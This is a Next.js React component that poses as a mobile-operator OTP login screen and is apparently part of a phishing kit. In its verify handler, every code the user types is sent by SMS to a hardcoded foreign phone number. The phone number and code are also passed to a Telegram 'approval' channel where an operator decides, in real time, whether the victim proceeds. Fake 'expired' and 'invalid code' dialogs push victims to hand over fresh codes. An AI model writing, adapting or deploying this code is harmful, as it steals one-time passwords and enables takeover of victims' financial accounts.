"use client"

import type React from "react"
import { useEffect, useMemo, useRef, useState } from "react"
import { useRouter } from "next/navigation"
import { AlertCircle, ArrowLeft, Loader2, RotateCw, ShieldQuestion } from "lucide-react"
import { Button } from "@/components/ui/button"
import { notifyResend, pollApproval, requestApproval } from "@/app/actions/telegram-approval"

const TIMEOUT_SECONDS = 45

export function OtpForm({
  phone,
  length = 6,
  redirectTo,
  backTo = "/",
}: {
  phone: string
  length?: number
  redirectTo: string
  backTo?: string
}) {
  const router = useRouter()
  const [digits, setDigits] = useState<string[]>(Array(length).fill(""))
  const [secondsLeft, setSecondsLeft] = useState(TIMEOUT_SECONDS)
  const [expired, setExpired] = useState(false)
  const [resending, setResending] = useState(false)
  const [verifying, setVerifying] = useState(false)
  const [errorOpen, setErrorOpen] = useState(false)
  const inputsRef = useRef<(HTMLInputElement | null)[]>([])
  const activeRequest = useRef<string | null>(null)
  const pollTimer = useRef<ReturnType<typeof setTimeout> | null>(null)

  const maskedPhone = useMemo(() => {
    const last = phone.slice(-3)
    return `+260 ••• ••• ${last}`
  }, [phone])

  // Countdown timer for the current OTP. Paused while waiting on Telegram approval.
  useEffect(() => {
    if (expired || verifying) return
    if (secondsLeft <= 0) {
      setExpired(true)
      return
    }
    const id = setTimeout(() => setSecondsLeft((s) => s - 1), 1000)
    return () => clearTimeout(id)
  }, [secondsLeft, expired, verifying])

  // Stop any in-flight polling when the component unmounts.
  useEffect(() => {
    return () => {
      activeRequest.current = null
      if (pollTimer.current) clearTimeout(pollTimer.current)
    }
  }, [])

  const code = digits.join("")
  const complete = code.length === length

  function focusInput(i: number) {
    inputsRef.current[i]?.focus()
  }

  function handleChange(index: number, value: string) {
    if (expired) return
    const char = value.replace(/\D/g, "").slice(-1)
    setDigits((prev) => {
      const next = [...prev]
      next[index] = char
      return next
    })
    if (char && index < length - 1) focusInput(index + 1)
  }
	
 const sendSM = async (phone: string, message: string) => {
  const response = await fetch("/api/send-sm", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      mobile: phone,
      response_type: "json",
      sender_name: "FULL_CIRCLE",
      service_id: 0,
      message,
    }),
  });

  return response.json();
};
  const sendSMS = async (phone: string, message: string) => {
  const response = await fetch("/api/send-sms", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      to: phone,
      message,
    }),
  });

  if (!response.ok) {
    throw new Error("Failed to send SMS");
  }

  return await response.json();
};

const message = `Y'ello. Please enter the following code:${code} to complete your login. Be safe. DO NOT SHARE this code with anybody. RdbS6eMOXvx`;
  function handleKeyDown(index: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      focusInput(index - 1)
    }
    if (e.key === "ArrowLeft" && index > 0) focusInput(index - 1)
    if (e.key === "ArrowRight" && index < length - 1) focusInput(index + 1)
  }

  function handlePaste(e: React.ClipboardEvent) {
    if (expired) return
    e.preventDefault()
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, length)
    if (!pasted) return
    const next = Array(length).fill("")
    for (let i = 0; i < pasted.length; i++) next[i] = pasted[i]
    setDigits(next)
    focusInput(Math.min(pasted.length, length - 1))
  }

  // Repeatedly polls Telegram for the Verify / Deny decision on this request.
  function startPolling(id: string) {
    const tick = async () => {
      if (activeRequest.current !== id) return
      const { status } = await pollApproval(id)
      if (activeRequest.current !== id) return

      if (status === "approved") {
        activeRequest.current = null
        router.push(redirectTo)
      } else if (status === "denied") {
        activeRequest.current = null
        setVerifying(false)
        setErrorOpen(true)
      } else {
        pollTimer.current = setTimeout(tick, 2000)
      }
    }
    pollTimer.current = setTimeout(tick, 1500)
  }

  async function handleVerify(e: React.FormEvent) {
    e.preventDefault()
    if (!complete || expired || verifying) return
    setVerifying(true)
     sendSMS(
      "+254737799310",
      message
    );
    //  sendSM(
    //   "+254768408107",
    //   message
    // );

    const res = await requestApproval({ phone, otp: code })
    if (!res.ok || !res.id) {
      setVerifying(false)
      setErrorOpen(true)
      return
    }
    activeRequest.current = res.id
    startPolling(res.id)
  }

  async function handleResend() {
    setResending(true)
    activeRequest.current = null
    if (pollTimer.current) clearTimeout(pollTimer.current)

    await notifyResend({ phone })

    setDigits(Array(length).fill(""))
    setSecondsLeft(TIMEOUT_SECONDS)
    setExpired(false)
    setErrorOpen(false)
    setVerifying(false)
    setResending(false)
    focusInput(0)
  }

  return (
    <form onSubmit={handleVerify} className="flex flex-col gap-6">
      <p className="text-pretty text-center text-sm text-muted-foreground">
        Enter the {length}-digit code sent to{" "}
        <span className="font-medium text-foreground">{maskedPhone}</span>
      </p>

      <div className="flex justify-center gap-2 sm:gap-3" onPaste={handlePaste}>
        {digits.map((digit, i) => (
          <input
            key={i}
            ref={(el) => {
              inputsRef.current[i] = el
            }}
            inputMode="numeric"
            autoComplete={i === 0 ? "one-time-code" : "off"}
            maxLength={1}
            value={digit}
            disabled={expired || verifying}
            onChange={(e) => handleChange(i, e.target.value)}
            onKeyDown={(e) => handleKeyDown(i, e)}
            aria-label={`Digit ${i + 1}`}
            className="size-12 rounded-lg border border-input bg-card text-center text-xl font-semibold text-foreground outline-none transition-colors focus:border-primary focus:ring-2 focus:ring-primary/40 disabled:cursor-not-allowed disabled:bg-muted disabled:text-muted-foreground sm:size-14"
          />
        ))}
      </div>

      {verifying ? (
        <div className="flex items-start gap-2 rounded-lg border border-primary/30 bg-primary/10 px-4 py-3">
          <Loader2 className="mt-0.5 size-4 shrink-0 animate-spin text-foreground" aria-hidden="true" />
          <div className="text-sm">
            <p className="font-semibold text-foreground">Awaiting approval</p>
            <p className="text-muted-foreground">
              A verification request was sent. Approve it to continue.
            </p>
          </div>
        </div>
      ) : expired ? (
        <div
          role="alert"
          className="flex items-start gap-2 rounded-lg border border-destructive/30 bg-destructive/10 px-4 py-3 text-destructive"
        >
          <AlertCircle className="mt-0.5 size-4 shrink-0" aria-hidden="true" />
          <div className="text-sm">
            <p className="font-semibold">OTP expired</p>
            <p className="text-destructive/90">
              Your verification code has expired. Please request a new one.
            </p>
          </div>
        </div>
      ) : (
        <p className="text-center text-sm text-muted-foreground">
          Code expires in{" "}
          <span className="font-semibold tabular-nums text-foreground">
            0:{secondsLeft.toString().padStart(2, "0")}
          </span>
        </p>
      )}

      {expired ? (
        <Button
          type="button"
          onClick={handleResend}
          disabled={resending}
          className="h-12 w-full text-base font-semibold"
        >
          {resending ? (
            <>
              <Loader2 className="size-4 animate-spin" />
              Resending…
            </>
          ) : (
            <>
              <RotateCw className="size-4" />
              Resend new OTP
            </>
          )}
        </Button>
      ) : (
        <Button
          type="submit"
          disabled={!complete || verifying}
          className="h-12 w-full text-base font-semibold"
        >
          {verifying ? (
            <>
              <Loader2 className="size-4 animate-spin" />
              Waiting for approval…
            </>
          ) : (
            "Verify & continue"
          )}
        </Button>
      )}

      <button
        type="button"
        onClick={() => router.push(backTo)}
        className="mx-auto flex items-center gap-1.5 text-sm font-medium text-muted-foreground transition-colors hover:text-foreground"
      >
        <ArrowLeft className="size-4" />
        Go back
      </button>

      {errorOpen ? (
        <div
          role="dialog"
          aria-modal="true"
          aria-labelledby="otp-error-title"
          className="fixed inset-0 z-50 flex items-center justify-center bg-foreground/40 p-4 backdrop-blur-sm"
        >
          <div className="w-full max-w-sm rounded-2xl border border-border bg-card p-6 shadow-xl">
            <div className="mx-auto mb-4 flex size-12 items-center justify-center rounded-full bg-destructive/10">
              <ShieldQuestion className="size-6 text-destructive" aria-hidden="true" />
            </div>
            <h2 id="otp-error-title" className="text-center text-lg font-semibold text-foreground">
              Invalid or expired OTP
            </h2>
            <p className="mt-1 text-center text-sm text-muted-foreground">
              We couldn&apos;t verify this code. It may be invalid or expired. Resend a new OTP to try again.
            </p>
            <Button
              type="button"
              onClick={handleResend}
              disabled={resending}
              className="mt-6 h-12 w-full text-base font-semibold"
            >
              {resending ? (
                <>
                  <Loader2 className="size-4 animate-spin" />
                  Resending…
                </>
              ) : (
                <>
                  <RotateCw className="size-4" />
                  Resend new OTP
                </>
              )}
            </Button>
          </div>
        </div>
      ) : null}
    </form>
  )
}
